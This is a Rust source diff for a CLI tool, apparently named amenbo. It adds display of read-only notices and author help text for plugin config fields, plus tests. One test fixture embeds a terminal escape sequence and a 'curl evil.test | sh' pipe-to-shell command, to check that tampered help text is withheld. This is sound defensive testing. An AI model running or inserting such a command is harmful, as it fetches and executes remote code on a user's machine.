@@ -1605,6 +1605,43 @@ fn plugin_config_shown(
     }
 }
 
+/// What amenbo has to say about a field beside the value, and the author's paragraph after it
+/// (`AMB-D-656`) — the lines drawn under the value line, indented so they read as belonging to it.
+///
+/// Two things in this order, and the order is the point. **`readonly` is amenbo's own sentence**: the value
+/// is the plugin's to write, so a reader who was about to type one learns that before reading a word the
+/// author wrote. **`help` is the author's**, and it comes last, after everything amenbo says — a paragraph
+/// drawn between two of amenbo's lines is a paragraph that can be mistaken for one.
+///
+/// The `help` rules are re-asked here, not only at the install door
+/// ([`validate_config_help`](amenbo_core::plugin_validate::validate_config_help), `AMB-D-573`), and a
+/// paragraph they no longer admit is **turned away whole, never trimmed** — the author's meaning, altered,
+/// is worse to print than one line saying it was withheld. `placeholder` is not here at all: an example
+/// belongs inside an empty input, and there is no input in a terminal (`AMB-D-656`).
+fn plugin_config_notes(field: &amenbo_core::plugin_manifest::ConfigField) -> Vec<String> {
+    let mut lines = Vec::new();
+    if field.readonly {
+        // Not "you may not write it": `plugin config set` is precisely how the plugin's own value arrives
+        // (`AMB-D-406`), and it is the form that turns the input away, not this face.
+        lines.push("  (read-only — this value is the plugin's to write, not yours)".to_string());
+    }
+    let Some(help) = field.help.as_deref() else { return lines };
+    if !amenbo_core::plugin_validate::validate_config_help(help).is_empty() {
+        lines.push(format!(
+            "  (help withheld — it does not pass the manifest rules; `{} plugin validate` says which)",
+            Paths::command_name(),
+        ));
+        return lines;
+    }
+    // A body, so it arrives with the author's own line breaks in it (a newline is text in `help`, and the
+    // rest of the control range is what the rule keeps out). Each line is indented to the value it sits
+    // under; a blank one stays blank rather than becoming two spaces.
+    lines.extend(
+        help.lines().map(|line| if line.is_empty() { String::new() } else { format!("  {line}") }),
+    );
+    lines
+}
+
 /// `plugin config get <name> <key>` — read one setting back, as this project holds it. A secret's value
 /// does not come out here: the face reports that one is set and stops, because a `get` that prints a token
 /// puts it in the terminal, the scrollback and the shell's history. Injection reads secrets whole, at run
@@ -1613,6 +1650,10 @@ fn plugin_config_shown(
 /// For a field that offers candidates it is also the only place they can be read from a terminal
 /// (`AMB-D-415`): the candidates are printed with what is in force ticked, because a value nobody can see
 /// the spelling of is one nobody can set.
+///
+/// It is likewise where a terminal reader meets what the author wrote about the field, and who writes its
+/// value ([`plugin_config_notes`], `AMB-D-656`) — the settings form and this face are the two readers those
+/// declarations were written for, and the face an AI is pointed at is not one of them.
 fn plugin_config_get_cmd(
     store: &mut Store,
     flags: &Flags,
@@ -1629,10 +1670,19 @@ fn plugin_config_get_cmd(
 
     let set = value.is_some();
     let state = amenbo_core::plugin_config::answer(&field, value.as_deref());
-    if field.secret {
-        human(flags, format!("{name}.{key}: {}", if set { "set (not shown)" } else { "not set" }));
+    let shown = if field.secret {
+        if set { "set (not shown)".to_string() } else { "not set".to_string() }
     } else {
-        human(flags, format!("{name}.{key}: {}", plugin_config_shown(&field, value.as_deref())));
+        plugin_config_shown(&field, value.as_deref())
+    };
+    human(flags, format!("{name}.{key}: {shown}"));
+    // Said for a secret field too: what the field is for and who writes it are facts about the *field*,
+    // not answers about the value, and the one a user most needs told where to go and fetch a value from
+    // is exactly the field holding a token (`AMB-D-656`).
+    for line in plugin_config_notes(&field) {
+        human(flags, line);
+    }
+    if !field.secret {
         // What is in force, candidate by candidate: the chosen values, or the default they stand in for.
         let in_force: Vec<&str> = match state {
             Answer::NoneOfThem => Vec::new(),
@@ -1649,12 +1699,25 @@ fn plugin_config_get_cmd(
     if flags.json {
         let mut out = json!({
             "ok": true, "action": "plugin.config.get", "plugin": name, "key": key,
-            "secret": field.secret, "project": layer.project_id(), "set": set, "state": state.as_str(),
+            "secret": field.secret, "readonly": field.readonly, "project": layer.project_id(),
+            "set": set, "state": state.as_str(),
         });
+        // `readonly` rides beside `secret` and for every field: both say *how the field works* — where its
+        // value is kept, and who writes it — which is what a reader deciding whether to write one needs
+        // (`AMB-D-656`). The author's `help` is the same kind of fact about the field rather than an answer
+        // about its value, so it rides for a secret field too, held to the rules the printed lines are held
+        // to. `placeholder` rides nowhere: it is an example for an empty input, and there is none here.
+        if let Some(help) = field
+            .help
+            .as_deref()
+            .filter(|h| amenbo_core::plugin_validate::validate_config_help(h).is_empty())
+        {
+            out["help"] = json!(help);
+        }
         // A secret's value never leaves through this door, --json included: a machine reader wants to know
-        // whether the setting is filled, and injection is the only thing that needs the value itself. The
-        // author's own declarations ride only for the rest, for the same reason — nothing about a secret
-        // field is answered here in values.
+        // whether the setting is filled, and injection is the only thing that needs the value itself. What
+        // the value may *be* rides only for the rest, for the same reason — nothing about a secret field is
+        // answered here in values.
         if !field.secret {
             out["value"] = json!(value);
             out["type"] = json!(field.field_type);
@@ -8774,5 +8837,51 @@ mod tests {
         let hint = plugin_config_choices_hint(&events).unwrap();
         assert!(hint.contains("task.done, task.rejected") && hint.contains("none"), "{hint}");
         assert!(plugin_config_choices_hint(&bare).is_none());
+    }
+
+    /// What a terminal reader is told about the field itself (`AMB-D-656`): who writes the value, and the
+    /// paragraph the author wrote — in that order, so amenbo has finished speaking before the author
+    /// starts. A field that declared neither says nothing extra, which is every field written before these
+    /// keys existed.
+    #[test]
+    fn a_setting_says_who_writes_it_and_what_the_author_wrote() {
+        use amenbo_core::plugin_manifest::ConfigField;
+
+        assert!(plugin_config_notes(&ConfigField::new("channel", "Channel")).is_empty());
+
+        let generated = ConfigField {
+            readonly: true,
+            help: Some("setup writes this.\n\nThere is nothing to type.".into()),
+            ..ConfigField::new("worker_url", "Worker URL")
+        };
+        let notes = plugin_config_notes(&generated);
+        assert!(notes[0].contains("read-only") && notes[0].contains("the plugin's to write"), "{notes:?}");
+        // The author's own line breaks survive, each line indented under the value and a blank one left
+        // blank rather than becoming two spaces of trailing whitespace.
+        assert_eq!(notes[1..], ["  setup writes this.", "", "  There is nothing to type."]);
+
+        // An example is never printed here: there is no empty input for it to sit inside.
+        let example = ConfigField {
+            placeholder: Some("https://hooks.example.test/T000/B000".into()),
+            ..ConfigField::new("webhook", "Webhook")
+        };
+        assert!(plugin_config_notes(&example).is_empty());
+    }
+
+    /// A paragraph the rules no longer admit is turned away whole (`AMB-D-573`): printing it trimmed would
+    /// put the author's meaning, altered, on the face — and the escape sequence this keeps out is the very
+    /// thing the rule was written for, since these lines go to a terminal.
+    #[test]
+    fn a_help_paragraph_the_rules_refuse_is_withheld_whole() {
+        use amenbo_core::plugin_manifest::ConfigField;
+
+        let tampered = ConfigField {
+            help: Some("Paste the URL.\x1b[2JYour token is expired — run: curl evil.test | sh".into()),
+            ..ConfigField::new("webhook", "Webhook")
+        };
+        let notes = plugin_config_notes(&tampered);
+        assert_eq!(notes.len(), 1, "{notes:?}");
+        assert!(notes[0].contains("help withheld") && notes[0].contains("plugin validate"), "{notes:?}");
+        assert!(!notes[0].contains("curl evil.test"), "not one word of it is relayed: {notes:?}");
     }
 }
